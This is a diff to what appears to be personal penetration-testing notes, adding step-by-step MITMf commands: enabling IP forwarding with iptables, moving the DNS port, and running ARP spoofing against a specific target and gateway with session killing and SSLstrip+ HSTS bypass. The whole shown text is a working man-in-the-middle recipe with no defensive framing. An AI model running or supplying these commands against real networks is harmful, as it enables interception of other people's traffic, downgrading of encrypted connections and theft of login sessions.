@@ -24,7 +24,11 @@ https://www.youtube.com/watch?v=NjNRzJV8Rvo
 #############################
 # mitmf
 #############################
-mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 --hsts
+1) iptables -P FORWARD ACCEPT
+2) /etc/mitmf/mitmf.conf (change 53 to 5300 for dns port conflict)
+3)mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts
+    -k : kill current login sesson
+    --hsts: Enables SSLstrip+ for partial HSTS bypass.
 
 #############################
 #  todo sslstrip2
